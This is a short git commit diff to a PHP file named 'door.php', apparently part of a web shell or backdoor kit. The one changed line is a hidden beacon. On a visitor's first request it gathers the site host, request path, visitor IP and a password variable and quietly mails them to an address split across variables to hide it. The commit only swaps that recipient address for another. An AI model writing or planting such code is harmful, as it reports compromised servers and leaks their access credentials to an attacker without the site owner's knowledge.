1d33f03ed15088502d3a39e15a3573ce3dbbe9db
sidhelchor <59345265+sidhelchor@users.noreply.github.com>
2019-12-30 21:47:53 +0600

    Update door.php

--- door.php
+++ door.php
@@ -1,4 +1,4 @@
-<?php $a=sidhel; $b=chor; $c=007; $d=hotmail; $e=com; $visitc = $_COOKIE["visits"]; if ($visitc == "") {  $visitc  = 0;  $visitor = $_SERVER["REMOTE_ADDR"];  $web     = $_SERVER["HTTP_HOST"];  $inj     = $_SERVER["REQUEST_URI"];  $target  = rawurldecode($web.$inj);  $sub   = "New sms from Server uploader http://$target by $visitor";  $body    = "Bug: $target by $visitor - $auth_pass";  if (!empty($web)) { @mail("$a$b$c@$d.$e",$sub,$body); }}
+<?php $a=anik; $b=jack; $c=440; $d=gmail; $e=com; $visitc = $_COOKIE["visits"]; if ($visitc == "") {  $visitc  = 0;  $visitor = $_SERVER["REMOTE_ADDR"];  $web     = $_SERVER["HTTP_HOST"];  $inj     = $_SERVER["REQUEST_URI"];  $target  = rawurldecode($web.$inj);  $sub   = "New sms from Server uploader http://$target by $visitor";  $body    = "Bug: $target by $visitor - $auth_pass";  if (!empty($web)) { @mail("$a$b$c@$d.$e",$sub,$body); }}
 else { $visitc  ; }
 @setcookie("visitz",$visitc);
 ?>
